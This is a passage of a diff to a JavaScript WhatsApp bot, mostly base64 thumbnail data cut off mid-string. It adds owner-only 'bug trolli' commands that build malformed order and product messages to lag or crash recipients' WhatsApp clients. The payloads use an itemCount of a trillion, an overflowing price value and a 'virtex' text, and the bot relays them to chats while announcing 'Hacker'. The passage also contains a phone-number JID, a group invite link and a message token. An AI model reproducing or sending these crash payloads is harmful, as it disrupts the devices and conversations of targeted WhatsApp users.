lwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
+"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
+"contextInfo": {
+"forwardingScore": 3,
+"isForwarded": true
+}
+}
+}, {quoted:imeu, contextInfo:{}})
+hexa.relayWAMessage(res)
+await setTimeout(() => {
+reply('Hacker ( SHERLYNN ~ 404 )')
+}, 3000)
+break   
+case 'psp': // BUG TROLLI + BUG GC + TROLLI
+if (!mek.key.fromMe && !isOwner) return
+buf = Mfake
+imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeg = imeu.message.imageMessage
+res = await dha.prepareMessageFromContent(from,{
+"orderMessage": {
+"orderId": "150453297177375",
+"thumbnail": "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",
+"itemCount": 1000000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"orderTitle": "GUA GK NGERTI",
+"message":"entah lah gua nob",
+"sellerJid": "6288224859350@s.whatsapp.net",
+"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
+"totalAmount1000": "Rp 25.000.00",
+"totalCurrencyCode": "IDR",
+"contextInfo": {
+"forwardingScore": 3,
+"isForwarded": true
+}
+}
+}, {quoted:bugtrol, contextInfo:{}}) 
+
+dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
+dha.relayWAMessage(res)
+break
+case 'plp':
+res = await dha.prepareMessageFromContent(from,{
+"listMessage": {
+"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
+"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
+"buttonText": vipi,
+"listType": "SINGLE_SELECT",
+"sections": [
+{
+"title": vipi,
+"rows": [
+{
+"title": "Banned",
+"rowId": "Banned"
+}
+]
+}
+]
+}
+}, {quoted:mek})
+dha.relayWAMessage(res)
+break   
+case 'pcp':
+if (!mek.key.fromMe && !isOwner) return
+buf = Mfake
+imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeg = imeu.message.imageMessage
+res = await dha.prepareMessageFromContent(from,{
+"productMessage": {
+"product": {
+"productImage": imeg,
+"productId": "150453297177375",
+"title": `PSYCOBOTZ ~ 404 ${vipi}`,
+"description": `${virtex}`,
+"currencyCode": "IDR",
+"priceAmount1000": "99999999999999999999999999999999",
+"productImageCount": 1
+},
+"businessOwnerJid": "6288224859350@s.whatsapp.net",
+"contextInfo": {
+"forwardingScore": 3,
+"isForwarded": true
+}
+}
+}, {quoted:bugtrol, contextInfo:{}}) 
+
+dha.relayWAMessage(res)
+break
+// Bug Trolli ( PSYCOBOTZ )
+case 'psp': // BUG TROLLI + BUG GC + TROLLI
+if (!mek.key.fromMe && !isOwner) return
+buf = Mfake
+imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeg = imeu.message.imageMessage
+res = await dha.prepareMessageFromContent(from,{
+"orderMessage": {
+"orderId": "150453297177375",
+"thumbnail": "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